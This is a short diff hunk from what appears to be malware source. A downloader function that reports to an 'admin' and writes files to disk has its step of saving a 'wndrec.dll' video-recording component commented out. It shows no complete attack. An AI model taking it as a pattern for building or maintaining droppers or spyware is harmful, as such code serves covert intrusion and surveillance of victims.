@@ -596,9 +596,9 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	SendLogToAdmin(2);
 	DBG( "JavaPatcher",  "Downloading Complete" );
 
-	m_lstrcpy( fileName, Path );
-	pPathAppendA( fileName, "wndrec.dll" );
-	SaveVideoDll(fileName);
+//	m_lstrcpy( fileName, Path );
+//	pPathAppendA( fileName, "wndrec.dll" );
+//	SaveVideoDll(fileName);
 
 	m_lstrcpy( fileName, Path );
 	pPathAppendA( fileName, "user.txt" );
